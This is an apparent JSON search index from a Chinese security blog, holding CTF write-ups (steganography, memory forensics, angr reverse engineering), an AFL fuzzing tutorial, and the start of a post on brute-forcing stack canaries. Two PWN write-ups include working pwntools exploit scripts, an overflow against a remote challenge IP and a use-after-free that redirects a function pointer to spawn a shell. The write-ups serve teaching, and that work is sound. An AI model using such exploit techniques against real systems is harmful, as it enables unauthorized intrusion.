{"pages":[{"title":"about","text":"","link":"/about/index%202.html"},{"title":"about","text":"","link":"/about/index.html"},{"title":"categories","text":"","link":"/categories/index%202.html"},{"title":"categories","text":"","link":"/categories/index.html"}],"posts":[{"title":"2018网鼎杯MISC——虚幻","text":"拿到这道题的时候，首先看了一下图片只有9x9像素，大小却有3k，使用二进制编辑器查看图片，可以看到图片结尾后又有一个png文件的magic。 可以使用binwalk -e解压出所有png图像 将得到的9张图拼好，得到下图中的10.png，再用Stegsolve得到11.bmp 但看着似乎有些怪怪的，对比普通二维码后好像是一个反相的二维码，于是使用Photoshop反相后得到下图： 这回看上去…..更扯了……，反正死活扫不出来。 最后好在放出了提示，说是汉信码，Google了一下，下上了汉信码的特征如下： 找了一个在线扫汉信码的网站终于给搞出flag了：flag{4ab1507d-d195-4d30-87c0-a0d85a77d953}","link":"/post/b32d2ce7.html"},{"title":"2018护网杯MISC——easy_dump","text":"这道题前半段做得相当顺利，最后在gnuplot绘图那卡了一下，不过最后还是搞出来了，还以为要拿一血了。。。 首先使用内存取证工具volatility分析题目文件easy_dump.img，可以看到是一个Win7/2008的内存映象。 查看运行的进程，发现一个notepad.exe程序值得注意： 使用volatility的notepad插件发现profile不支持此插件 于是直接通过PID去dump notepad.exe的内存 使用strings查找dump文件中的字符串，同时由于记事本以16位little-endian存储文本，所以需要使用参数：strings -e l ./2560.dmp，即以16位little-endian方式编码。 但并非真正的flag，而是提示有一张奇怪的jpg图片。 根据上面的提示查找内存中的图片，并dump图片 使用binwalk分析发现图片后包含了一个zip文件解压后是一个名为message.img的文件 使用file命令查看文件，是一个Linux ext2文件系统 直接挂载mkdir fs &amp;&amp; mount message.img fs，查看文件系统内容，发现一个提示文件hint.txt： 有些类似于坐标，使用命令行的交互式绘图工具gnuplot绘图，得到一个QR二维码 扫码得到如下内容： Here is the vigenere key: aeolus, but i deleted the encrypted message。 根据上面的提示，继续寻找被删除的加密消息，进入.Trash-0查看被删除文件，可以看到一个vim swp文件（临时交换文件，用来备份缓冲区中的内容，防止意外vim退出） 直接vim message就可以看到恢复文件的提示，按下R 根据前面二维码的提示，这是一个vigenere加密的字符，key为aeolus，找一个在线解密网站解密，由于vigenere不会加密数字和符号，所以再为其添加上符号得到flag flag{yeeeeeeet!just_find_and_solve}","link":"/post/d87f7e0c.html"},{"title":"2018护网杯PWN——gettingstart","text":"签到题。。。 将程序放入IDA中反编译结果如下： 可以看到当不满足条件if(v7!=0x7FFFFFFFFFFFFFFF || v8!=0.1)时就可以拿到shell，同时read()函数读取了0x28个字节到变量buf所在地址，刚好可以覆盖v7、v8，将两个变量覆盖为0x7fffffffffffffff和0.1就可以绕过判断getshell，exp如下： 12345678#!/usr/bin/env pythonfrom pwn import *p = remote('49.4.79.129', 30453)payload = \"a\"*24 + p64(0x7fffffffffffffff) + p64(0x3fb999999999999a)p.recvuntil(\"you.\")p.sendline(payload)p.interactive() flag{7542c88042ac18feff9c3c091822fb63}","link":"/post/d87f7e0c.html"},{"title":"2018网鼎杯PWN-fgo","text":"分析过程首先checksec： 1234567$ checksec pwn[*] '/root/ex/fgo' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 运行结果如下，看样子应该是和堆有关了，一般来说这种CTF中添加删除XXX的程序都是存在UAF的 首先查看add_servant()函数，一般来说从这种添加item的函数中我们可以逆向出每个item的结构 12345678910111213141516171819202122232425262728293031323334353637383940414243444546unsigned int add_servant(){ _DWORD *v0; // ebx signed int i; // [esp+Ch] [ebp-1Ch] int size; // [esp+10h] [ebp-18h] char buf; // [esp+14h] [ebp-14h] unsigned int v5; // [esp+1Ch] [ebp-Ch] v5 = __readgsdword(0x14u); if ( count &lt;= 5 ) { for ( i = 0; i &lt;= 4; ++i ) { if ( !servantlist[i] ) { servantlist[i] = malloc(8u); if ( !servantlist[i] ) { puts(\"Error\"); exit(-1); } *(_DWORD *)servantlist[i] = print_servant_content; puts(\"the size of servant's name : \"); read(0, &amp;buf, 8u); size = atoi(&amp;buf); v0 = servantlist[i]; v0[1] = malloc(size); if ( !*((_DWORD *)servantlist[i] + 1) ) { puts(\"Error\"); exit(-1); } puts(\"ability : \"); read(0, *((void **)servantlist[i] + 1), size); puts(\"Success !\"); ++count; return __readgsdword(0x14u) ^ v5; } } } else { puts(\"your team is full\"); } return __readgsdword(0x14u) ^ v5;} 从上面的代码可以得知，该函数首先分配了一个8直接大小结构体，将其指针放入全局数组servantlist[i]中： 1234stract servant{ ssize_t (*print_servant_content)(void *); char* ability;} 同时为ability分配size大小的空间，存储描述每个servant的ability的字符串 1234567891011+----------------+ | servantlist[i] | malloc(8) +----------------+---------&gt;+----------------------+ | print_servant_content| +----------------------+ | ability | malloc(size) +----------------------+---------------&gt;+----------------+ | | | content | | | +----------------+ 在看看print_servant()和print_servant_content()12345678910111213141516171819unsigned int print_servant(){ int index; // [esp+4h] [ebp-14h] char buf; // [esp+8h] [ebp-10h] unsigned int v3; // [esp+Ch] [ebp-Ch] v3 = __readgsdword(0x14u); printf(\"Index :\"); read(0, &amp;buf, 4u); index = atoi(&amp;buf); if ( index &lt; 0 || index &gt;= count ) { puts(\"Out of bound!\"); exit(0); } if ( servantlist[index] ) (*(void (__cdecl **)(void *))servantlist[index])(servantlist[index]); return __readgsdword(0x14u) ^ v3;} 1234int __cdecl print_servant_content(int a1){ return puts(*(const char **)(a1 + 4));} 很显然print_servant()调用了print_servant_content()，同时将servant结构体的地址作为参数传入print_servant_content()，该函数再用put打印servant+4即ability的内容。 到这里为止没有发现什么漏洞，我们继续往下看。 在函数del_servant()中，首先free掉ability的内容，再free整个servant结构体，但之后却没有将这些指针设为NULL，这导致了UAF的可能。 12345678910111213141516171819202122unsigned int del_servant(){ int v1; // [esp+4h] [ebp-14h] char buf; // [esp+8h] [ebp-10h] unsigned int v3; // [esp+Ch] [ebp-Ch] v3 = __readgsdword(0x14u); puts(\"Index : \"); read(0, &amp;buf, 4u); v1 = atoi(&amp;buf); if ( v1 &lt; 0 || v1 &gt;= count ) { puts(\"Out of bound\"); exit(0); } if ( !servantlist[v1] ) return __readgsdword(0x14u) ^ v3; free(*((void **)servantlist[v1] + 1)); free(servantlist[v1]); puts(\"Success \"); return __readgsdword(0x14u) ^ v3;} 同时程序中还有一个secret()函数，用于执行bash。 接下来思路就很明确了： 首先明确首要目的：执行secret()以获取shell 结构体中刚好有个指向print_servant_content()的函数指针 想办法利用UAF将print_servant_content()的指针换为secret() 利用过程 首先连续添加两个ability大小为32的servant0和servant1（不为8即可），可以看到heap中有了4个fastbin 12345678910111213141516171819202122232425262728293031323334353637383940414243pwndbg&gt; heap0x804c000 FASTBIN { prev_size = 0, size = 17, fd = 0x804862b &lt;print_servant_content&gt;, bk = 0x804c018, fd_nextsize = 0x0, bk_nextsize = 0x29}0x804c010 FASTBIN { prev_size = 0, size = 41, fd = 0x61616161, bk = 0xa6161, fd_nextsize = 0x0, bk_nextsize = 0x0}0x804c038 FASTBIN { prev_size = 0, size = 17, fd = 0x804862b &lt;print_servant_content&gt;, bk = 0x804c050, fd_nextsize = 0x0, bk_nextsize = 0x29}0x804c048 FASTBIN { prev_size = 0, size = 41, fd = 0x62626262, bk = 0xa62, fd_nextsize = 0x0, bk_nextsize = 0x0}0x804c070 PREV_INUSE { prev_size = 0, size = 135057, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0}pwndbg&gt; 接着删除掉刚添加的两个servant，我们就得到了两个空闲的大小为8的fastbin 123456789pwndbg&gt; fastbinsfastbins0x10: 0x804c038 —▸ 0x804c000 ◂— 0x00x18: 0x00x20: 0x00x28: 0x804c048 —▸ 0x804c010 ◂— 0x00x30: 0x00x38: 0x00x40: 0x0 再次添加一个servant2，大小为8，此时为该servant的ability分配的内存应该就是刚才servant0所在位置的内存，我们将新添加的servant结构的ability设置dead看看，不出所料，EIP可控。 EXP所以exp中，将servant2的ability设置为secret()函数地址，再次调用print_servant()显示servant0时，便可getshell。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#!/usr/bin/pythonfrom pwn import *context.os = 'linux'context.terminal = ['tmux', 'splitw', '-h']# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']context.log_level = 'INFO'bin_path = './fgo'binary = ELF(bin_path)def debug(command=''): gdb.attach(p, command)def add_servant(size, ability): p.recvuntil(\":\") p.sendline(\"1\") p.recvuntil(\":\") p.sendline(str(size)) p.recvuntil(\":\") p.sendline(ability)def del_servant(index): p.recvuntil(\":\") p.sendline(\"2\") p.recvuntil(\":\") p.sendline(str(index))def print_servant(index): p.recvuntil(\":\") p.sendline(\"3\") p.recvuntil(\":\") p.sendline(str(index))def exploit(): addr_secret = 0x08048956 #address of secret() add_servant(32, \"zzzz\") #servant 0 add_servant(32, \"xxxx\") #servant 1 del_servant(0) #delete 0 del_servant(1) #delete 1 add_servant(8, p32(addr_secret)) print_servant(0) #use after free p.interactive()if __name__ == '__main__': if len(sys.argv) == 1: global p p = process(executable=bin_path, argv=[bin_path]) else: p = remote(sys.argv[1], int(sys.argv[2])) exploit() FLAG值：flag{76f46d8c4d8cd55773b558d50be67687}","link":"/post/e40dc053.html"},{"title":"2018网鼎杯PWN-easyFMT","text":"分析过程checksec： 1234567$ checksec pwn[*] '/root/pwn' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)","link":"/post/72ca88fe.html"},{"title":"2018网鼎杯RE——martricks","text":"一开始以为这道题是要逆向算法，看了老半天，最后也没搞出来。直到赛后看了writeup才知道要用符号执行来做，算是长见识了… 这里就记录一下加深印象，以便以后遇到类似的问题可以解决。 程序结构非常简单，scanf读取输入内容做一些加密运算后比较，正确输出”congrats!”否则输出”wrong flag!” 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566__int64 __fastcall main(__int64 a1, char **a2, char **a3){ unsigned __int8 v4; // [rsp+Bh] [rbp-E5h] signed int v5; // [rsp+Ch] [rbp-E4h] signed int v6; // [rsp+10h] [rbp-E0h] int v7; // [rsp+14h] [rbp-DCh] signed int v8; // [rsp+18h] [rbp-D8h] signed int v9; // [rsp+1Ch] [rbp-D4h] int v10; // [rsp+1Ch] [rbp-D4h] int v11; // [rsp+20h] [rbp-D0h] int i; // [rsp+20h] [rbp-D0h] int v13; // [rsp+24h] [rbp-CCh] int v14; // [rsp+28h] [rbp-C8h] signed int v15; // [rsp+2Ch] [rbp-C4h] char v16[56]; // [rsp+B0h] [rbp-40h] unsigned __int64 v17; // [rsp+E8h] [rbp-8h] __int64 savedregs; // [rsp+F0h] [rbp+0h] v17 = __readfsqword(0x28u); puts(\"input your flag:\"); __isoc99_scanf(\"%49s\", v16); v15 = 1; v9 = 0; v11 = 23; while ( v9 &lt;= 48 ) { *((_BYTE *)&amp;savedregs + 7 * (v11 / 7) + v11 % 7 - 192) = v16[v9] ^ v11; *((_BYTE *)&amp;savedregs + 7 * (v9 / 7) + v9 % 7 - 128) = byte_601060[v11] ^ v9; ++v9; v11 = (v11 + 13) % 49; } v10 = 41; v13 = 3; v14 = 4; v7 = 5; v5 = 0; while ( v5 &lt;= 6 &amp;&amp; v15 ) { v6 = 0; while ( v6 &lt;= 6 &amp;&amp; v15 ) { v4 = 0; v8 = 0; while ( v8 &lt;= 6 ) { v4 += *((_BYTE *)&amp;savedregs + 7 * v7 + v14 - 128) * *((_BYTE *)&amp;savedregs + 7 * v13 + v7 - 192); ++v8; v7 = (v7 + 5) % 7; } for ( i = 17; i != v10; i = (i + 11) % 49 ) ; if ( byte_6010A0[7 * (i / 7) + i % 7] != ((unsigned __int8)i ^ v4) ) v15 = 0; v10 = (v10 + 31) % 49; ++v6; v14 = (v14 + 4) % 7; } ++v5; v13 = (v13 + 3) % 7; } if ( v15 ) puts(\"congrats!\"); else puts(\"wrong flag!\"); return 0LL;} 显然程序存在两种状态，一种成功，一种是失败。 符号执行中极为常见的操作是找到到达某个地址的状态，同时丢弃到达另一个地址的所有状态。这可以通过angr的Simulation manager的explore()方法实现。 该程序中成功和失败处的地址分别为0x400A89和0x400A90 当使用find参数执行explore()时，执行将一直运行，直到找到与查找条件匹配的状态，将其放入stash中。同样的，用avoid条件匹配时，它将被放入避免的stash中，并继续执行。 解题脚本如下： 12345678910111213#!/usr/bin/env pythonimport angrdef main(): p = angr.Project(\"martricks\") # 创建一个project state = p.factory.entry_state() # 获取入口函数 simgr = p.factory.simgr(state) # 在程序主入口点构造好一个state simgr.explore(find=0x400A84, avoid=0x400A90) # 查找匹配状态 return simgr.found[0].posix.dumps(0).strip('\\0\\n')if __name__ == '__main__': print main() flag{Everyth1n_th4t_kill5_m3_m4kes_m3_fee1_aliv3} angr安装安装angr 1apt install python-dev libffi-dev build-essential virtualenvwrapper 激活虚拟环境 1$ source angr/bin/activate 安装angr 1pip install angr","link":"/post/cecfe556.html"},{"title":"AFL漏洞挖掘技术漫谈：使用AFL开始第一Fuzzing","text":"##前言模糊测试（Fuzzing）技术作为漏洞挖掘最有效的手段之一，近年来一直是众多安全研究人员发现漏洞的首选技术。AFL、LibFuzzer、honggfuzz等操作简单友好的工具相继出现，也极大地降低了模糊测试的门槛。笔者近期学习漏洞挖掘过程中，感觉目前网上相关的的资源有些冗杂，让初学者有些无从着手，便想在此对学习过程中收集的一些优秀的博文、论文和工具进行总结与梳理、分享一些学习过程中的想法和心得，同时对网上一些没有涉及到的内容做些补充。 由于相关话题涉及的内容太广，笔者决定将所有内容分成一系列文章，且只围绕AFL这一具有里程碑意义的工具展开，从最简单的使用方法和基本概念讲起，再由浅入深介绍测试完后的后续工作、如何提升Fuzzing速度、一些使用技巧以及对源码的分析等内容。因为笔者接触该领域也不久，内容中难免出现一些错误和纰漏，欢迎大家在评论中指正。 第一篇文章旨在让读者对AFL的使用流程有个基本的认识，文中将讨论如下一些基本问题： AFL的基本原理和工作流程； 如何选择Fuzzing的⽬标? 如何获得初始语料库? 如何使用AFL构建程序？ AFL的各种执行方式； AFL状态窗口中各部分代表了什么意义？ ##二、AFL简介AFL（American Fuzzy Lop）是由安全研究员Michał Zalewski（@lcamtuf）开发的一款基于覆盖引导（Coverage-guided）的模糊测试工具，它通过记录输入样本的代码覆盖率，从而调整输入样本以提高覆盖率，增加发现漏洞的概率。 ①从源码编译程序时进行插桩，以记录代码覆盖率（Code Coverage）；②选择一些输入文件，作为初始测试集加入输入队列（queue）；③将队列中的文件按一定的策略进行“突变”；④如果经过变异文件更新了覆盖范围，则将其保留添加到队列中;⑤上述过程会一直循环进行，期间触发了crash的文件会被记录下来。 ##三、选择和评估测试的目标 开始Fuzzing前，首先要选择一个目标。 AFL的目标通常是接受外部输入的程序或库，输入一般来自文件（后面的文章也会介绍如何Fuzzing一个网络程序）。 ###1. 用什么语言编写AFL主要用于C/C++程序的测试，所以这是我们寻找软件的最优先规则。（也有一些基于AFL的JAVA Fuzz程序如kelinci、java-afl等，但并不知道效果如何） ###2. 是否开源 AFL既可以对源码进行编译时插桩，也可以使用AFL的QEMU mode对二进制文件进行插桩，但是前者的效率相对来说要高很多，在Github上很容易就能找到很多合适的项目。 ###3. 程序版本目标应该是该软件的最新版本，不然辛辛苦苦找到一个漏洞，却发现早就被上报修复了就尴尬了。 ###4. 是否有示例程序、测试用例如果目标有现成的基本代码示例，特别是一些开源的库，可以方便我们调用该库不用自己再写一个程序；如果目标存在测试用例，那后面构建语料库时也省事儿一点。 ###5.项目规模某些程序规模很大，会被分为好几个模块，为了提高Fuzz效率，在Fuzzing前，需要定义Fuzzing部分。这里推荐一下源码阅读工具Understand，它treemap功能，可以直观地看到项目结构和规模。比如下面ImageMagick的源码中，灰框代表一个文件夹，蓝色方块代表了一个文件，其大小和颜色分别反映了行数和文件复杂度。 ###6. 程序曾出现过漏洞如果某个程序曾曝出过多次漏洞，那么该程序有仍有很大可能存在未被发现的安全漏洞。如ImageMagick每个月都会发现难以利用的新漏洞，并且每年都会发生一些具有高影响的严重漏洞，图中可以看到仅2017年就有357个CVE！(图源medium.com) ##四、构建语料库AFL需要一些初始输入数据（也叫种子文件）作为Fuzzing的起点，这些输入甚至可以是毫无意义的数据，AFL可以通过启发式算法自动确定文件格式结构。lcamtuf就在博客中给出了一个有趣的例子——对djpeg进行Fuzzing时，仅用一个字符串”hello”作为输入，最后凭空生成大量jpge图像！ 尽管AFL如此强大，但如果要获得更快的Fuzzing速度，那么就有必要生成一个高质量的语料库，这一节就解决如何选择输入文件、从哪里寻找这些文件、如何精简找到的文件三个问题。 ###1. 选择 ####(1) 有效的输入尽管有时候无效输入会产生bug和崩溃，但有效输入可以更快的找到更多执行路径。 ####(2) 尽量小的体积较小的文件会不仅可以减少测试和处理的时间，也能节约更多的内存，AFL给出的建议是最好小于1 KB，但其实可以根据自己测试的程序权衡，这在AFL文档的perf_tips.txt中有具体说明。 ###2. 寻找 使用项目自身提供的测试用例 目标程序bug提交页面 使用格式转换器，用从现有的文件格式生成一些不容易找到的文件格式： afl源码的testcases目录下提供了一些测试用例 其他大型的语料库 afl generated image test sets fuzzer-test-suite libav samples ffmpeg samples fuzzdata moonshine ###3. 修剪网上找到的一些大型语料库中往往包含大量的文件，这时就需要对其精简，这个工作有个术语叫做——语料库蒸馏（Corpus Distillation）。AFL提供了两个工具来帮助我们完成这部工作——afl-cmin和afl-tmin。 ####(1) 移除执行相同代码的输入文件——afl-cminafl-cmin的核心思想是：尝试找到与语料库全集具有相同覆盖范围的最小子集。举个例子：假设有多个文件，都覆盖了相同的代码，那么就丢掉多余的文件。其使用方法如下： 1$ afl-cmin -i input_dir -o output_dir -- /path/to/tested/program [params] 更多的时候，我们需要从文件中获取输入，这时可以使用“@@”代替被测试程序命令行中输入文件名的位置。Fuzzer会将其替换为实际执行的文件：1$ afl-cmin -i input_dir -o output_dir -- /path/to/tested/program [params] @@ 下面的例子中，我们将一个有1253个png文件的语料库，精简到只包含60个文件。 ####(2) 减小单个输入文件的大小——afl-tmin整体的大小得到了改善，接下来还要对每个文件进行更细化的处理。afl-tmin缩减文件体积的原理这里就不深究了，有机会会在后面文章中解释，这里只给出使用方法（其实也很简单，有兴趣的朋友可以自己搜一搜）。 afl-tmin有两种工作模式，instrumented mode和crash mode。默认的工作方式是instrumented mode，如下所示： 1$ afl-tmin -i input_file -o output_file -- /path/to/tested/program [params] @@ 如果指定了参数-x，即crash mode，会把导致程序非正常退出的文件直接剔除。 1$ afl-tmin -x -i input_file -o output_file -- /path/to/tested/program [params] @@ afl-tmin接受单个文件输入，所以可以用一条简单的shell脚本批量处理。如果语料库中文件数量特别多，且体积特别大的情况下，这个过程可能花费几天甚至更长的时间！ 1for i in *; do afl-tmin -i $i -o tmin-$i -- ~/path/to/tested/program [params] @@; done; 下图是经过两种模式的修剪后，语料库大小的变化： 这时还可以再次使用afl-cmin，发现又可以过滤掉一些文件了。 ##五、构建被测试程序前面说到，AFL从源码编译程序时进行插桩，以记录代码覆盖率。这个工作需要使用其提供的两种编译器的wrapper编译目标程序，和普通的编译过程没有太大区别，本节就只简单演示一下。 ###1. afl-gcc模式afl-gcc/afl-g++作为gcc/g++的wrapper，它们的用法完全一样，前者会将接收到的参数传递给后者，我们编译程序时只需要将编译器设置为afl-gcc/afl-g++就行，如下面演示的那样。如果程序不是用autoconf构建，直接修改Makefile文件中的编译器为afl-gcc/g++也行。 1$ ./configure CC=\"afl-gcc\" CXX=\"afl-g++\" 在Fuzzing共享库时，可能需要编写一个简单demo，将输入传递给要Fuzzing的库（其实大多数项目中都自带了类似的demo）。这种情况下，可以通过设置LD_LIBRARY_PATH让程序加载经过AFL插桩的.so文件，不过最简单的方法是静态构建，通过以下方式实现： 1$ ./configure --disable-shared CC=\"afl-gcc\" CXX=\"afl-g++\" 下面libtiff这个例子中，加上--disable-shared选项后，libtiff.so被编译进了目标程序中。 ###2. LLVM模式LLVM Mode模式编译程序可以获得更快的Fuzzing速度，用法如下所示：1234$ cd llvm_mode$ apt-get install clang$ export LLVM_CONFIG=`which llvm-config` &amp;&amp; make &amp;&amp; cd ..$ ./configure --disable-shared CC=\"afl-clang-fast\" CXX=\"afl-clang-fast++\"笔者在使用高版本的clang编译时会报错，换成clang-3.9后通过编译，如果你的系统默认安装的clang版本过高，可以安装多个版本然后使用update-alternatives切换。 ##六、开始Fuzzingafl-fuzz程序是AFL进行Fuzzing的主程序，用法并不难，但是其背后巧妙的工作原理很值得研究，考虑到第一篇文章只是让读者有个初步的认识，这节只简单的演示如何将Fuzzer跑起来，其他具体细节这里就暂时略过。 ###1. 白盒测试 ####(1) 测试插桩程序编译好程序后，可以选择使用afl-showmap跟踪单个输入的执行路径，并打印程序执行的输出、捕获的元组（tuples），tuple用于获取分支信息，从而衡量衡量程序覆盖情况，下一篇文章中会详细的解释，这里可以先不用管。1234567$ afl-showmap -m none -o /dev/null -- ./build/bin/imagew 23.bmp out.png[*] Executing './build/bin/imagew'...-- Program output begins --23.bmp -&gt; out.pngProcessing: 13x32-- Program output ends --[+] Captured 1012 tuples in '/dev/null'.使用不同的输入，正常情况下afl-showmap会捕获到不同的tuples，这就说明我们的的插桩是有效的，还有前面提到的afl-cmin就是通过这个工具来去掉重复的输入文件。1234567$ $ afl-showmap -m none -o /dev/null -- ./build/bin/imagew 111.pgm out.png[*] Executing './build/bin/imagew'...-- Program output begins --111.pgm -&gt; out.pngProcessing: 7x7-- Program output ends --[+] Captured 970 tuples in '/dev/null'. ####(2) 执行fuzzer在执行afl-fuzz前，如果系统配置为将核心转储文件（core）通知发送到外部程序。 将导致将崩溃信息发送到Fuzzer之间的延迟增大，进而可能将崩溃被误报为超时，所以我们得临时修改core_pattern文件，如下所示： 1echo core &gt;/proc/sys/kernel/core_pattern 之后就可以执行afl-fuzz了，通常的格式是：1$ afl-fuzz -i testcase_dir -o findings_dir /path/to/program [params] 或者使用“@@”替换输入文件，Fuzzer会将其替换为实际执行的文件：1$ afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@ 如果没有什么错误，Fuzzer就正式开始工作了。首先，对输入队列中的文件进行预处理；然后给出对使用的语料库可警告信息，比如这里提示有个较大的文件（14.1KB），且输入文件过多；最后，开始Fuzz主循环，显示状态窗口。 ####(3) 使用screen一次Fuzzing过程通常会持续很长时间，如果这期间运行afl-fuzz实例的终端终端被意外关闭了，那么Fuzzing也会被中断。而通过在screen session中启动每个实例，可以方便的连接和断开。关于screen的用法这里就不再多讲，大家可以自行查询。1$ screen afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@ 也可以为每个session命名，方便重新连接。12345$ screen -S fuzzer1$ afl-fuzz -i testcase_dir -o findings_dir /path/to/program [params] @@[detached from 6999.fuzzer1]$ screen -r fuzzer1 ... ###2. 黑盒测试 所谓黑盒测试，通俗地讲就是对没有源代码的程序进行测试，这时就要用到AFL的QEMU模式了。启用方式和LLVM模式类似，也要先编译。但注意，因为AFL使用的QEMU版本太旧，util/memfd.c中定义的函数memfd_create()会和glibc中的同名函数冲突，在这里可以找到针对QEMU的patch，之后运行脚本build_qemu_support.sh就可以自动下载编译。1234$ apt-get install libini-config-dev libtool-bin automake bison libglib2.0-dev -y$ cd qemu_mode$ build_qemu_support.sh$ cd .. &amp;&amp; make install 现在起，只需添加-Q选项即可使用QEMU模式进行Fuzzing。 1$ afl-fuzz -Q -i testcase_dir -o findings_dir /path/to/program [params] @@ 3. 并行测试(1) 单系统并行测试如果你有一台多核心的机器，可以将一个afl-fuzz实例绑定到一个对应的核心上，也就是说，机器上有几个核心就可以运行多少afl-fuzz 实例，这样可以极大的提升执行速度，虽然大家都应该知道自己的机器的核心数，不过还是提一下怎么查看吧： 1$ cat /proc/cpuinfo| grep \"cpu cores\"| uniq afl-fuzz并行Fuzzing，一般的做法是通过-M参数指定一个主Fuzzer(Master Fuzzer)、通过-S参数指定多个从Fuzzer(Slave Fuzzer)。 1234$ screen afl-fuzz -i testcases/ -o sync_dir/ -M fuzzer1 -- ./program$ screen afl-fuzz -i testcases/ -o sync_dir/ -S fuzzer2 -- ./program$ screen afl-fuzz -i testcases/ -o sync_dir/ -S fuzzer3 -- ./program ... 这两种类型的Fuzzer执行不同的Fuzzing策略，前者进行确定性测试（deterministic ），即对输入文件进行一些特殊而非随机的的变异；后者进行完全随机的变异。 可以看到这里的-o指定的是一个同步目录，并行测试中所有的Fuzzer将相互协作，在找到新的代码路径时，相互传递新的测试用例，如下图中以Fuzzer0的角度来看，它查看其它fuzzer的语料库，并通过比较id来同步感兴趣的测试用例。 afl-whatsup工具可以查看每个fuzzer的运行状态和总体运行概况，加上-s选项只显示概况，其中的数据都是所有fuzzer的总和。 还afl-gotcpu工具可以查看每个核心使用状态。 (2) 多系统并行测试多系统并行的基本工作原理类似于单系统并行中描述的机制，你需要一个简单的脚本来完成两件事。在本地系统上，压缩每个fuzzer实例目录中queue下的文件，通过SSH分发到其他机器上解压。 来看一个例子，假设现在有两台机器，基本信息如下： fuzzer1 fuzzerr2 172.21.5.101 172.21.5.102 运行2个实例 运行4个实例 为了能够自动同步数据，需要使用authorized_keys的方式进行身份验证。现要将fuzzer2中每个实例的输入队列同步到fuzzer1中，可以下面的方式： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#!/bin/sh# 所有要同步的主机FUZZ_HOSTS='172.21.5.101 172.21.5.102'# SSH userFUZZ_USER=root# 同步目录SYNC_DIR='/root/syncdir'# 同步间隔时间SYNC_INTERVAL=$((30 * 60))if [ \"$AFL_ALLOW_TMP\" = \"\" ]; then if [ \"$PWD\" = \"/tmp\" -o \"$PWD\" = \"/var/tmp\" ]; then echo \"[-] Error: do not use shared /tmp or /var/tmp directories with this script.\" 1&gt;&amp;2 exit 1 fifirm -rf .sync_tmp 2&gt;/dev/nullmkdir .sync_tmp || exit 1while :; do # 打包所有机器上的数据 for host in $FUZZ_HOSTS; do echo \"[*] Retrieving data from ${host}...\" ssh -o 'passwordauthentication no' ${FUZZ_USER}@${host} \\ \"cd '$SYNC_DIR' &amp;&amp; tar -czf - SESSION*\" &gt;\".sync_tmp/${host}.tgz\" done # 分发数据 for dst_host in $FUZZ_HOSTS; do echo \"[*] Distributing data to ${dst_host}...\" for src_host in $FUZZ_HOSTS; do test \"$src_host\" = \"$dst_host\" &amp;&amp; continue echo \" Sending fuzzer data from ${src_host}...\" ssh -o 'passwordauthentication no' ${FUZZ_USER}@$dst_host \\ \"cd '$SYNC_DIR' &amp;&amp; tar -xkzf - &amp;&gt;/dev/null\" &lt;\".sync_tmp/${src_host}.tgz\" done done echo \"[+] Done. Sleeping for $SYNC_INTERVAL seconds (Ctrl-C to quit).\" sleep $SYNC_INTERVAL done 成功执行上述shell脚本后，不仅SESSION000 SESSION002中的内容更新了，还将SESSION003 SESSION004也同步了过来。 ##七、认识AFL状态窗口通过状态窗口，我们可以监控Fuzzer运行时的各种信息，在status_screen中有详细的说明，这里只是做一个简单的介绍，对已经了解这部分的读者可以直接跳过，如果需要更具体的内容，可以去看看原文。另外说一下，该输出信息也不是必须的，后面的文章中会提到如何将Fuzzer的输出重定向到/dev/null，然后通过其他方法取得Fuzzer运行状态。 ① Process timing:Fuzzer运行时长、以及距离最近发现的路径、崩溃和挂起经过了多长时间。 ② Overall results：Fuzzer当前状态的概述。 ③ Cycle progress：我们输入队列的距离。 ④ Map coverage：目标二进制文件中的插桩代码所观察到覆盖范围的细节。 ⑤ Stage progress：Fuzzer现在正在执行的文件变异策略、执行次数和执行速度。 ⑥ Findings in depth：有关我们找到的执行路径，异常和挂起数量的信息。 ⑦ Fuzzing strategy yields：关于突变策略产生的最新行为和结果的详细信息。 ⑧ Path geometry：有关Fuzzer找到的执行路径的信息。 ⑨ CPU load：CPU利用率 ##八、总结 到此为止，本文已经介绍完了如何开始一次Fuzzing，但这仅仅是一个开始。AFL 的Fuzzing过程是一个死循环，我们需要人为地停止，那么什么时候停止？上面图中跑出的18个特别的崩溃，又如何验证？还有文中提到的各种概念——代码覆盖率、元组、覆盖引导等等又是怎么回事儿？所谓学非探其花，要自拔其根，学会工具的基本用法后，要想继续进阶的话，掌握这些基本概念相当重要，有助于后续更深层次内容的理解。所以后面的几篇文章，首先会继续本文中未完成的工作，然后详细讲解重要概念和AFL背后的原理，敬请各位期待。 ##参考资料 [1]American Fuzzy Lop[2]Yet another memory leak in ImageMagick[3]Vulnerability Discovery Against Apple Safari[4]Pulling JPEGs out of thin air[5]parallel_fuzzing.txt[6]Fuzzing workflows; a fuzz job from start to finish[7]Open Source Fuzzing Tools - ‘Chapter 10 Code Coverage and Fuzzing’[8]Fuzzing for Software Security Testing and Quality Assurance - ‘7.2 Using Code Coverage Information’","link":"/post/6c314f.html"},{"title":"Bypassing Canary——Brute force","text":"我们都一般来说，一个链接了标准库的文件都以__libc_start_main为开始，该函数会初始化一些必要的数据结构，其中也包括了Canary，它由下面这个函数产生：12// glibc-2.29 -- csu/libc-start.cuintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random) 也就是说Canary的值在程序一开始运行时就已经确定了。而对于典型的多进程并发服务器，程序统一由父进程来accept连接，然后fork子进程处理读写。子进程数据空间中的内容是父进程的完整拷贝，二者具有相同的Canary，这也让爆破Canary成为了可能。 首先Canary第0位永远是0x00，这是为了防止Canary被打印出来做的截断。 确定溢出长度后，在该长度基础上逐位增加一字节爆破，如果程序没有崩溃则说明该位正确 一直跑出Canary的所有位，64位程序最多尝试7*256次，32位最多尝试3*256次 下面来看具体的例子。 NJCTF2017 messagerchecksec: 1234567$ checksec messager[*] '/root/NJCTF2017/messager' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 分析使用IDA分析，我们可以得到第一个关键信息 